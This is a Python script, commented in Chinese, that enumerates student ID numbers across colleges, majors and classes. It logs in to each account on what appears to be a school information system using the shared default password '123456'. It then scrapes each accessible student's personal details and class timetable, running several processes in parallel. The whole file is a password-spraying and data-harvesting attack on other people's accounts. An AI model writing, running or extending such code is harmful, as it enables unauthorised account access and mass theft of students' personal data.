# 获取一个区间内的学号,然后信息, 然后入库
import os
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils import core
import datetime, time
from utils import logins, core, users, kb
from pa_app.view_user.update_pwd import update_pwd
from pa_app.view_funcs import login_view
from utils import view_funcs
from pa_app.view_class_card import crad
from multiprocessing import Process,current_process

# xh = 202040030101

YEAR = 2021
XUE_2 = 4
BANJI_MAX = 10  # 最多个班级
MAX_REN = 50    # 一个班级最大人数
DENG_1 = 20     # 等待错误密码的
PWD = '123456'
P = 5   # 一次性多少个线程(一次扫描多少个学院)
config = core.load_config_yaml(mode='WAI')

def get_user(start):
    '''
    202040030101    # 最后的01在这里进行拼接(也就是这个人在班级里的学号)
    start: 2020400301
    '''
    is_you = 0
    for i in range(1, MAX_REN+1):
        if i == DENG_1 and is_you == 0:
            return 1    # 这个班级没人,后面就不用跑了
        try:
            x = logins.get_login_cookies(start*100+i, PWD, config)
            if not x[-1]:
                continue
            is_you = 1
            res = x[0]
            users.get_uesr_info(res)
            view_funcs.xueqi_xuanze(res, 0)
            kb.get_kebiao(res)
        except Exception as e:
            print(e)
            continue
    return 0

def get_zhuanye(xh:int):
    """
    给前面几位, 后面的自动补充
    202040030101
    xh: 20204003
    """
    x = 0
    for i in range(1, BANJI_MAX+1):
        if x > 3:   # 如果连着走了3个班都没人
            return 1
        xx = get_user(xh*100+i)
        if xx == 1:
            x += xx

    return 0
            

def get_yuan1(xh:int):
    """
    给前面几位, 后面的自动补充
    202040030101
    xh: 202040
    """
    x = 0
    x2 = 0
    for i in range(1, BANJI_MAX+1):
        if x > 3: # 如果3个专业都没人(没有这三个专业)   # TODO 这里应该是连着的3次，而不是有三次
            xh += 1
            x - 3
            x2 += 1
            if x2 > 3:
                # return 1
                xh += 0
        xx = get_zhuanye(xh*100+i)
        if xx == 1:
            x += xx
        else:
            x = 0

    return 0


if __name__ == '__main__':
    # print(get_user(202040090101))
    # pri   nt(get_zhuanye(20214021))
    # print(get_zhuanye(20204404))
    
    # print(get_yuan1(202047))
    # print(get_yuan1(202040030422))
    c = 202030
    for i in range(c, c + P):                         # 循环10次，创建10次(个)进程
        p = Process(target=get_yuan1, args=(i,))     # 创建1个进程，这个进程执行pin1函数
        p.start()                                 # 启动这个进程
    
